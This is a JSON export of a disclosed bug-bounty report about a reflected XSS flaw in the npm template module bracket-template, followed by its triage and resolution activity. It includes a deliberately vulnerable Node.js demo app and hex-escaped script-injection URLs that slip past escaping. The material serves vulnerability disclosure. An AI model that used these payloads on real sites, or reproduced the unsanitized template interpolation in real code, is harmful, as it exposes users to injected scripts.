@@ -1,0 +1,385 @@
+{
+  "id": 317125,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTcxMjU=",
+  "url": "https://hackerone.com/reports/317125",
+  "title": "[bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-02-17T14:19:09.371Z",
+  "submitted_at": "2018-02-17T14:19:09.371Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-04-09T14:58:19.748Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-03-10T14:58:15.958Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\nI would like to report Reflected XSS in bracket-template module.\nIt allows to inject arbitrary JavaScript tag and malicious code to execute when variables read from GET are used directly in template without sanitization.\n\n## Module\n\n**module name:** bracket-template\n**version:** 1.1.5\n**npm page:** https://www.npmjs.com/package/bracket-template\n\n### Description\n\nMinimal (über fast) Javascript engine compatible with node.js and browsers.\n\n### Module Stats\n\nStats:\n\n51 downloads in the last day\n209 downloads in the last week\n835 downloads in the last month\n\n~10000 estimated downloads per year\n\n## Description\n\nWhile testing ```bracket-template``` module, I've found that there is possibility to inject malicious ```<script>``` tag followed by JavaScript code when values passed via GET are used in templates directly, without any sanitization.\n\n## Steps To Reproduce:\n\n- install ```bracket-template``` module:\n\n```\n$ npm install bracket-template\n```\n\n- create sample aaplication, which reads ```name``` from url and displays welcome message in the browser:\n\n```javascript\n// app.js file\nconst http = require('http')\nconst bracket = require('bracket-template').default\nconst port = 8080\n\nfunction createHTML(name) {\n    let tpl = `\n        [[ const n = '${name}'; ]]\n        <strong>Hello [[= n ]]</strong>\n    `\n    return bracket.compile(tpl)\n}\n\nconst requestHandler = (request, response) => {\n    const name = request.url.split('=')[1]\n    response.writeHeader(200, { \"Content-Type\": \"text/html\" });\n    response.write(createHTML(name)());\n    response.end();\n}\n\nconst server = http.createServer(requestHandler)\n\nserver.listen(port, (err) => {\n    if (err) {\n        return console.log(err)\n    }\n    console.log(`server is listening on ${port}`)\n})\n```\n\n- run application:\n\n```\n$ node app.js\n```\n\n- open ```http://localhost:8080?name=bl4de``` in the browser. You will notice expected result:\n\n{F264368}\n\n- now, try to inject following malicious XSS payload: ```http://localhost:8080?name=bl4de<script>console.log('XSS?')</script>```. You will notice all HTML special characters were escaped:\n\n{F264369}\n\n\n- this time, use following payload: ```http://localhost:8080/?name=bl4de\\x3cscript\\x3econsole.log(\\x22uh\\x20oh,\\x20XSS...\\x20:(\\x22)\\x3c\\x2fscript\\x3e``` and see the result in browser dev tools console:\n\n\n{F264370}\n\n\nWhen we investigate HTML returned from the server, we can notice using ```\\x[hex][hex]``` notation allows to inject any HTML special character and crafts XSS payload:\n\n```HTML\n<strong>Hello bl4de<script>console.log(\"uh oh, XSS... :(\")</script></strong>\n```\n\nAlso, I have noticed that this vector is not detected by built-in XSS protection (XSS Auditor) in Blink/WebKit based browsers (Chromium, Safari, Chrome, Opera), which causes additional risk for anyone who uses ```bracket-template``` in production application.\n\n\n## Supporting Material/References:\n\nThis issue was found and tested with following setup:\n\n- macOS HighSierra 10.13.3\n- Node.js v.8.9.3\n- npm v. 5.5.1\n- Chromium 66.0.3342.0, Safari 11.03 (with XSS Auditor enabled), Chrome 64.0.3282.167 (with XSS Auditor enabled)\n\n## Wrap up\n\n- I contacted the maintainer to let him know: No\n- I opened an issue in the related repository: No\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis issue can be used by malicious user to exploit Reflected XSS against application  which outputs variables passed via GET parameters directly in template(s) without any sanitization.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 264368,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/368/5404583ac56a8e64b69905947920c21c08640253/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075357Z&X-Amz-Expires=1003&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2c131fca66e59619ff12e383cd28a6897088719656b43828d065bae60d08d080",
+      "file_size": 113040,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 264369,
+      "file_name": "2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/369/380fbd02d94f877178129f6ec4c2a0bc011e5fbe/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075357Z&X-Amz-Expires=1003&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2f361497ef9c280070228d836edf50b7a9075d237b20c7df65ccf286d587ee59",
+      "file_size": 167346,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 264370,
+      "file_name": "3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/370/476deed12b4d2d1b03e8420ba470c80f8c1b2cf8/3.png?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075357Z&X-Amz-Expires=1003&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=66b9cafc419233f9986173b291a38c3bbe48939fdd9b2b0e86e849573026a660",
+      "file_size": 139693,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-04-09T14:58:16.031Z",
+  "allow_singular_disclosure_after": -172169741.02116692,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "muhammad_uwais",
+    "whitesector",
+    "eveeez",
+    "pandaonair",
+    "x1m",
+    "khaledibnalwalid",
+    "vibs123i",
+    "japz"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 6793,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "bracket-template",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 2395359,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-17T20:20:52.135Z",
+      "updated_at": "2018-02-17T20:20:52.135Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2395361,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @bl4de ,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n",
+      "automated_response": false,
+      "created_at": "2018-02-17T20:21:26.934Z",
+      "updated_at": "2018-02-17T20:21:26.934Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2395465,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I couldn't locate an e-mail address associated with the author so I opened a GitHub issue to ask to join us.",
+      "automated_response": false,
+      "created_at": "2018-02-17T22:30:28.231Z",
+      "updated_at": "2018-02-17T22:30:28.231Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2479556,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ChangedScope",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-03-10T14:57:55.131Z",
+      "updated_at": "2018-03-10T14:57:55.131Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "old_scope": "Other module",
+      "new_scope": "bracket-template",
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2479557,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-03-10T14:58:08.687Z",
+      "updated_at": "2018-03-10T14:58:08.687Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "bl4de",
+        "url": "/bl4de"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2479558,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-03-10T14:58:15.993Z",
+      "updated_at": "2018-03-10T14:58:15.993Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2479559,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I will continue a public disclosure since there's been no activity from the maintainers on this.",
+      "automated_response": false,
+      "created_at": "2018-03-10T14:58:38.352Z",
+      "updated_at": "2018-03-10T14:58:38.352Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2581418,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-04-09T14:58:20.229Z",
+      "updated_at": "2018-04-09T14:58:20.229Z",
+      "actor": {
+        "url": "/nodejs-ecosystem",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Node.js third-party modules"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2582994,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-04-09T19:17:17.874Z",
+      "updated_at": "2018-04-09T19:17:17.874Z",
+      "additional_data": {
+        "old_severity": "Medium",
+        "new_severity": "High (8.6)",
+        "old_severity_id": 120105,
+        "new_severity_id": 137476
+      },
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
